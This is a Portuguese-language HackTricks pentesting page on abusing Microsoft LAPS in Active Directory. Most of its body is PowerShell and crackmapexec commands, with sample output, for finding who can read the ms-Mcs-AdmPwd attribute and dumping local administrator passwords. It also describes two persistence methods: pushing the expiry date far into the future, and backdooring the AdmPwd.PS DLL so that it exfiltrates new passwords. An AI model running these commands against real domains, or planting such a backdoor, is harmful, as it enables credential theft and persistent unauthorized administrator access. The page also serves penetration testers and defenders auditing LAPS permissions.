# LAPS

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [repositório hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Informações Básicas

**LAPS** permite que você **gerencie a senha do Administrador local** (que é **aleatória**, única e **alterada regularmente**) em computadores associados ao domínio. Essas senhas são armazenadas centralmente no Active Directory e restritas a usuários autorizados usando ACLs. As senhas são protegidas em trânsito do cliente para o servidor usando Kerberos v5 e AES.

Ao usar o LAPS, **2 novos atributos** aparecem nos objetos **computador** do domínio: **`ms-mcs-AdmPwd`** e **`ms-mcs-AdmPwdExpirationTime`**. Esses atributos contêm a **senha de administrador em texto simples e o tempo de expiração**. Em um ambiente de domínio, pode ser interessante verificar **quais usuários podem ler** esses atributos.

### Verificar se está ativado
```bash
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
```
### Acesso à Senha do LAPS

Você pode **baixar a política LAPS bruta** de `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` e, em seguida, usar o **`Parse-PolFile`** do pacote [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) para converter esse arquivo em um formato legível para humanos.

Além disso, os **cmdlets nativos do LAPS PowerShell** podem ser usados se estiverem instalados em uma máquina à qual temos acesso:
```powershell
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
**PowerView** também pode ser usado para descobrir **quem pode ler a senha e lê-la**:
```powershell
# Find the principals that have ReadPropery on ms-Mcs-AdmPwd
Get-AdmPwdPassword -ComputerName wkstn-2 | fl

# Read the password
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
```
### LAPSToolkit

O [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) facilita a enumeração do LAPS com várias funções.\
Uma delas é analisar os **`ExtendedRights`** para **todos os computadores com LAPS ativado**. Isso mostrará **grupos** especificamente **delegados para ler senhas do LAPS**, que geralmente são usuários em grupos protegidos.\
Uma **conta** que tenha **adicionado um computador** a um domínio recebe `All Extended Rights` sobre esse host, e esse direito dá à **conta** a capacidade de **ler senhas**. A enumeração pode mostrar uma conta de usuário que pode ler a senha do LAPS em um host. Isso pode nos ajudar a **direcionar usuários específicos do AD** que podem ler senhas do LAPS.
```powershell
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expirations time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## **Extraindo Senhas LAPS com o Crackmapexec**
Se não houver acesso a um powershell, você pode abusar desse privilégio remotamente por meio do LDAP usando o Crackmapexec.
```
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
```
Isso irá extrair todas as senhas que o usuário pode ler, permitindo que você obtenha uma posição melhor com um usuário diferente.

## **Persistência do LAPS**

### **Data de Expiração**

Uma vez como administrador, é possível **obter as senhas** e **impedir** que uma máquina **atualize** sua **senha** ao **definir a data de expiração no futuro**.
```powershell
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## It's needed SYSTEM on the computer
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
{% hint style="warning" %}
A senha ainda será redefinida se um **administrador** usar o cmdlet **`Reset-AdmPwdPassword`**; ou se a opção **Não permitir tempo de expiração de senha maior do que o exigido pela política** estiver habilitada na GPO do LAPS.
{% endhint %}

### Backdoor

O código-fonte original do LAPS pode ser encontrado [aqui](https://github.com/GreyCorbel/admpwd), portanto é possível colocar um backdoor no código (dentro do método `Get-AdmPwdPassword` em `Main/AdmPwd.PS/Main.cs`, por exemplo) que de alguma forma **exfiltra novas senhas ou as armazena em algum lugar**.

Em seguida, basta compilar o novo `AdmPwd.PS.dll` e fazer o upload para a máquina em `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (e alterar a data de modificação).

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de cibersegurança**? Gostaria de ver sua **empresa anunciada no HackTricks**? Ou gostaria de ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o repositório [hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
